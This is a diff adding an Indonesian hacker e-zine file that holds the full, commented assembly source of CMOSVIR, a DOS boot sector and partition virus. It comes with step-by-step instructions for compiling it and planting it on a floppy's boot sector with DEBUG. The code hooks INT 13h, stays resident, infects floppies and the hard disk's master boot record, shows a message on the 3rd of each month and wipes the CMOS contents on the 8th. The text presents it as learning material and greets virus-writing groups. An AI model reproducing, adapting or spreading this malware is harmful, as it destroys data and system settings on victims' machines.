@@ -1,0 +1,391 @@
+Terbitan Online Kecoak Elektronik
+http://k-elektronik.org
+
+
+=============================================================================
+Program CMOSVIR.ASM
+Oleh: CyberBug (Kecoak Elektronik)
+=============================================================================
+
+
+; Program : CMOSVIR.ASM
+; CMOS Scanner - Boot Sector/Partition Virus
+; Menampilkan pesan tiap tanggal 3 dan menghapus isi CMOS tiap tanggal 8
+;
+; (c) CyberBug - 15 Desember 1993 (Actually I used my real name before).
+; Dibangkitkan kembali khusus untuk Kecoak Elektronik :)
+; Buat yg senang bahasa Assembly tapi nggak tau mau mulai dari mana. 
+; 
+; Disclaimer:
+; Kecoak Elektronik tidak bertanggung jawab atas penyalah gunaan listing
+; virus ini.
+;
+; Greetz to NoMercyVirusTeam, and All Indonesian Virus Maker.
+;
+; CARA INSTALL
+; 1. Compile dengan Turbo Assembler sbb: 
+;    TASM CMOSVIR
+;    Hasil compile harus berjumlah 1024 KB, kalau tidak saya yg salah :(
+; 2. Format disket 1,2KB/1,44KB dengan option /S 
+;    Copy file DEBUG.COM dan CMOSVIR.EXE ke disket tsb.
+;    Masukkan Disket 1,2KB/1,44KB tsb di drive A:
+; 3. Masuk ke BIOS kemudian set semua HDD BIOS anda ke None, jangan bilang
+;    anda tidak diperingatkan !
+;    Boot Komputer dengan disket 1,2KB/1,44KB tsb.
+; 4. Tulis Boot Sector asli ke Track 0, Side 1, Sector E
+;    A:\>DEBUG [Enter]
+;    -L 100 0 0 1 [Enter]
+;    -W 100 0 1C 1 [Enter]
+;    -Q
+; 5. Copy Kode CMOSVIR ke Boot Sector
+;    A:\>DEBUG CMOSVIR.EXE [Enter]
+;    -W 0 0 0 1 [Enter]
+;    -Q
+; 6. Sekarang disket sudah berisi virus, cukup dengan Warm Boot virus akan
+;    masuk ke memory dan menginfeksi apa saja yang dia mau ... keep an eye
+;    of your girl friend ... my virus could be looking for her too :)
+
+
+; KETERANGAN BAGIAN
+; (1) : Proses Boot dan meresidenkan
+; (2) : Proses penularan ke hard disk (akhir boot)
+; (3) : Proses penularan ke disket (setelah residen)
+
+seg_a segment
+      assume cs:seg_a,ds:seg_a
+
+;(1) AWAL PROGRAM SAAT BOOT
+
+                jmp     residen
+
+;    BAGIAN DATA VIRUS
+
+                nop
+
+off_int13       db      59h,0ECh
+
+seg_int13       db      02,0C6h
+
+off_int13_baru  db      0F5h,00
+
+seg_int13_baru  db      80h,9Fh
+
+kode_sector     db      03,00
+
+;(3) AWAL PROGRAM RESIDENT
+
+vect13:
+                push    ax
+                push    ds
+
+;(3) APAKAH DRIVE A?
+
+                or      dl,dl                   ; apakah DL=0 ?
+                jnz     bukan_A                 ; jika tidak loncat ke bukan_A
+
+;(3) APAKAH MOTOR DRIVE BERHENTI?
+
+                xor     ax,ax                   ; AX=0
+                mov     ds,ax                   ; set DS=0
+                test    byte ptr ds:[43Fh],1    ; motor off ?
+                jnz     bukan_A                 ; jika tidak loncat ke bukan_A
+
+;(3) PENUTUP BAGIAN RESIDENT
+
+                pop     ds
+                pop     ax
+                pushf                           ; Push flags
+                call    dword ptr cs:off_int13  ; jalankan int 13 asli
+                pushf                           ; Push flags
+                call    subrutin                ; jalankan program virus
+                popf                            ; Pop flags
+                retf    2                       ; Return far
+
+;(3) JIKA BUKAN DRIVE A ATAU MOTOR TIDAK OFF
+
+bukan_A:
+                pop     ds
+                pop     ax
+                jmp     dword ptr cs:off_int13      ; loncat ke int 13 asli
+
+
+;(3) AWAL BAGIAN 3 (BAGIAN RESIDENT)
+
+subrutin        proc    near
+                push    ax
+                push    bx
+                push    cx
+                push    dx
+                push    ds
+                push    es
+                push    si
+                push    di
+                push    cs                      ; set DS=CS
+                pop     ds
+                push    cs                      ; set ES=CS
+                pop     es
+
+;(3) BACA BOOT SECTOR DI DRIVE A: LETAKKAN DI OFFSET 200 (UNTUK PENULARAN)
+;    DIULANG JIKA GAGAL BACA DISK
+
+                mov     si,4                    ; untuk counter 4x
+bacaboot_A:
+                mov     ax,201h                 ; baca 1 sector
+                mov     bx,200h                 ; ke offset 200
+                mov     cx,1                    ; track 0, sector 1
+                xor     dx,dx                   ; head/side 0, drive 0/A:
+                pushf                           ; Push flags
+                call    dword ptr ds:off_int13  ; int 13 asli
+                jnc     cek_A                   ; jika sukses loncat ke cek_A
+
+                xor     ax,ax                   ; AH=0/reset disk
+                pushf                           ; Push flags
+                call    dword ptr ds:off_int13  ; int 13 asli
+                dec     si                      ; SI dikurangi 1
+                jnz     bacaboot_A              ; jika SI tidak nol loncat ke bacaboot_A
+                jmp     short selesai           ; jika 4x gagal baca loncat ke selesai
+
+;(3) PEMERIKSAAN APAKAH ADA VIRUS DI A:
+
+cek_A:
+                xor     si,si                   ; SI=0
+                cld                             ; arah load positif
+                lodsw                           ; String [si] di load ke ax
+                cmp     ax,[bx]                 ; bandingkan ax dgn yg ditunjuk BX
+                jne     tulari_disk             ; jika tidak sama loncat ke tulari_disk
+                lodsw                           ; String [si] di load ke ax
+                cmp     ax,[bx+2]               ; bandingkan ax dgn yg ditunjuk bx
+                jz      selesai                 ; jika sama loncat ke selesai
+
+;(3) PENULARAN, JIKA TIDAK ADA VIRUS DI DISKET
+;    TULIS BOOT SECTOR KE TRACK 0, HEAD 1 SECTOR 3 (DISKET DD)
+;                                         SECTOR E (DISKET HD)
+
+tulari_disk:
+                mov     ax,301h                 ; tulis 1 sector
+                mov     dh,1                    ; ke head/side 1
+                mov     cl,3                    ; sector 3
+                cmp     byte ptr [bx+15h],0FDh  ; apakah disket DD (360KB)?
+                je      tulis_disk              ; jika ya loncat ke tulis_disk
+                mov     cl,0Eh                  ; sector E (disket HD)
+tulis_disk:
+                mov     word ptr ds:kode_sector,cx ; simpan kode disk di offset 8
+                pushf                           ; Push flags
+                call    dword ptr ds:off_int13  ; int 13 asli
+                jc      selesai                 ; jika gagal tulis loncat ke selesai
+
+;(3) COPY SEBAGIAN BOOT ASLI KE BOOT VIRUS
+
+copy_boot:
+                mov     si,200h+offset sisa     ; dari boot asli
+                mov     di,offset sisa          ; ke   boot virus
+                mov     cx,39h                  ; sebesar 39h
+                cld                             ; Clear direction
+                rep     movsw                   ; Ulang selama cx>0 salin isi offset 3F2h ke offset 1BEh
+
+;(3) TULIS BOOT VIRUS KE TRACK 0, HEAD 0, SECTOR 1
+
+                mov     ax,301h                 ; tulis 1 sector
+                xor     bx,bx                   ; dari offset 0
+                mov     cx,1                    ; ke track 0, sector 1
+                xor     dx,dx                   ; head/side 0, drive 0 / A:
+                pushf                           ; Push flags
+                call    dword ptr ds:off_int13  ; int 13 asli
+
+selesai:
+                pop di
+                pop si
+                pop es
+                pop ds
+                pop dx
+                pop cx
+                pop bx
+                pop ax
+                retn
+
+subrutin        endp
+
+
+;(1) AWAL BAGIAN I (ME-RESIDENT-KAN)
+
+residen:
+                xor     ax,ax                   ; AX=0
+                mov     ds,ax                   ; set DS=0
+                cli                             ; Disable interrupts
+                mov     ss,ax                   ; set SS=0
+                mov     ax,7C00h                ; AX=7C00
+                mov     sp,ax                   ; set SP=7C00 (offset boot)
+                sti                             ; Enable interrupts
+                push    ds                      ; simpan 0000:7C00 di stack
+                push    ax                      ; utk boot normal (retf)
+
+;(1) SIMPAN VECTOR INT 13 ASLI KE OFFSET 7C03 DAN 7C05
+
+                mov     ax,word ptr ds:[4Ch]               ; offset vector int 13
+                mov     word ptr ds:[7C00h][off_int13],ax  ; simpan di offset 7C03
+                mov     ax,word ptr ds:[4Eh]               ; segment vector int 13
+                mov     word ptr ds:[7C00h][seg_int13],ax  ; simpan di offset 7C05
+
+;(1) KURANGI BASE MEMORI 2 KB
+
+                mov     ax,word ptr ds:[413h]   ; Base Memory
+                dec     ax                      ; kurangi 1KB
+                dec     ax                      ; kurangi 1KB
+                mov     word ptr ds:[413h],ax   ; simpan kembali
+
+;(1) SET VECTOR INT 13 KE 9F80:000E (OFFSET VIRUS)
+
+                mov     cl,6                                    ; counter
+                shl     ax,cl                                   ; digeser kekiri 6 bit
+                mov     es,ax                                   ; ES=9F80
+                mov     word ptr ds:[7C00h][seg_int13_baru],ax  ; catat di offset 7C0C
+                mov     ax,offset vect13                        ; set vector int 13
+                mov     word ptr ds:[4Ch],ax                    ; offset = vect13 = E
+                mov     word ptr ds:[4Eh],es                    ; segment 9F80
+
+;(1) COPY 0000:7C00 KE 9F80:0000, PROSES ME-RESIDENT-KAN
+
+                mov     cx,offset sisa          ; sebanyak 1F2h (484 byte)
+                mov     si,7C00h                ; offset 7C00
+                xor     di,di                   ; offset 0000
+                cld                             ; Clear direction
+                rep     movsb                   ; Ulang selama cx>0 salin isi 0000:7C00 ke 9F80:0000
+
+;(1) AKHIR BAGIAN 1
+;    EKSEKUSI PINDAH KE ALAMAT PADA OFFSET 7C00 + off_int13_baru
+;    YAITU SEGMENT-VIRUS (9F80):OFFSET-BAGIAN 2 (00F5)
+
+                jmp     dword ptr cs:[7C00h][off_int13_baru]    ; 9F80:00F5
+
+;(2) BAGIAN 2 (PENULARAN SAAT BOOT)
+;    DI EKSEKUSI DARI SEGMENT VIRUS (9F80)
+
+                xor     ax,ax                   ; AX=0
+                mov     es,ax                   ; ES=0
+                int     13h                     ; reset disk
+                push    cs                      ; set DS=CS=9F80
+                pop     ds
+
+;(2) BACA BOOT/PARTISI ASLI, LETAKKAN KE 0000:7C00
+;    UNTUK BOOT NORMAL
+
+                mov     ax,201h                 ; baca 1 sector
+                mov     bx,7C00h                ; ke offset 7C00
+                mov     cx,word ptr ds:kode_sector      ; ambil kode disk
+                cmp     cx,7                    ; bandingkan dgn 7 (harddisk)
+                jnz     bootdisk                ; jika bukan boot dari disk
+baca_C:
+                mov     dx,80h                  ; head/side 0, drive C
+                int     13h                     ; baca sector ke memory es:bx
+                jmp     cektgl                  ; ke cektgl
+
+;(2) PROSES BOOT DARI DISKET
+
+bootdisk:
+                mov     cx,word ptr ds:kode_sector      ; ambil kode disk
+                mov     dx,100h                 ; head/side 1, drive 0/A:
+                int     13h                     ; baca sector ke memory es:bx
+                jc      cektgl                  ; jika gagal baca, ke cektgl
+
+;(2) BACA PARTISI HARD DISK, LETAKKAN KE 9F80:0200
+
+                push    cs
+                pop     es
+                mov     ax,201h                 ; baca 1 sector
+                mov     bx,200h                 ; ke offset 200
+                mov     cx,1                    ; track 0, sector 1
+                mov     dx,80h                  ; head 0, drive C
+                int     13h                     ; baca sector ke memory es:bx
+                jc      cektgl                  ; jika gagal, cek tanggal
+
+;(2) PERIKSA APAKAH ADA VIRUS DI HD, JIKA TIDAK, TULARI
+
+                xor     si,si                   ; SI=0
+                cld                             ; Clear direction
+                lodsw                           ; isi yg ditunjuk  [si] salin ke ax
+                cmp     ax,[bx]                 ; bandingkan ax dgn alamat yg ditunjuk bx
+                jne     tulpart                 ; jika tidak ada CMOS Scanner
+                lodsw                           ; isi yg ditunjuk [si] salin ke ax
+                cmp     ax,[bx+2]               ; bandingkan ax dgn alamat yg ditunjuk bx+2
+                jne     tulpart                 ; jika tidak ada CMOS Scanner
+
+;(2) CEK TANGGAL
+cektgl:
+                xor     cx,cx
+                mov     ah,04                   ; baca tanggal
+                int     1Ah
+                cmp     dl,03h                  ; tanggal 3?
+                je      pesan
+
+cmos:
+                cmp     dl,08h                  ; tanggal 8?
+                jne     boot
+                mov     byte ptr ds:counter,00h
+uling:
+                mov     al,ds:counter
+                out     70h,al
+                mov     al,00h
+                out     71h,al
+                inc     byte ptr ds:counter
+                cmp     byte ptr ds:counter,0FFh
+                jne     uling
+boot:
+                retf                            ; Return far (jmp ke isi stack)
+
+;(2) TAMPILKAN PESAN
+pesan:
+                mov     si,offset Data
+lanjut:
+                push    cs
+                pop     ds
+ulang:
+                lodsb
+                sub     al,41h
+                cmp     al,9h                   ; al = 9h ?
+                jz      boot                    ; jika sama boot
+                mov     ah,0Eh
+                mov     bh,0
+                int     10h                     ; Video display   ah=functn 0Eh
+                                                ; write char al, teletype mode
+                jmp     short ulang             ; ulangi pesan
+
+
+;(2) PENULARAN KE HARD DISK, TULIS PARTISI ASLI KE TRACK 0, HEAD 0, SECTOR 7
+tulpart:
+                mov     cx,0007                 ; track 0, sector 7
+                mov     word ptr ds:kode_sector,cx   ; simpan kode disk
+                mov     ax,0301                 ; tulis 1 sector
+                mov     dx,0080                 ; head 0, drive C
+                int     13h                     ; tulis
+                jb      cektgl                  ; jika gagal, cektgl
+
+;(2) COPY BAGIAN BELAKANG PARTISI ASLI KE PARTISI VIRUS
+
+copy_part:
+                mov     si,200h+offset sisa     ; dari boot asli
+                mov     di,offset sisa          ; ke   boot virus
+                mov     cx,39h                  ; sebanyak 32h byte
+                rep     movsw                   ; Ulang selama cx>0 salin [si] ke es:[di]
+
+;(2) TULIS BOOT VIRUS KE PARTISI HARD DISK
+
+                mov     ax,301h                 ; tulis 1 sector
+                xor     bx,bx                   ; dari offset 0000 (partisi virus)
+                inc     cl
+                int     13h
+                jmp     cektgl
+
+Data            db      84h,8Eh,90h,94h,61h                   
+                db      94h,0A4h,0A2h,0AFh,0AFh,0A6h,0B3h,61h 
+                db      69h,48h,0A4h,48h,6Ah,48h,61h          
+                db      84h,0BAh,0A3h,0A6h,0B3h               
+                db      83h,0B6h,0A8h,61h,61h                 
+                db      4Bh,4Eh,4Bh,4Ah ; LF CR
+
+Counter         db      0h
+
+Sisa            db      57 dup (0)              ; tempat data sisa boot/partisi
+
+seg_a ends
+end
+
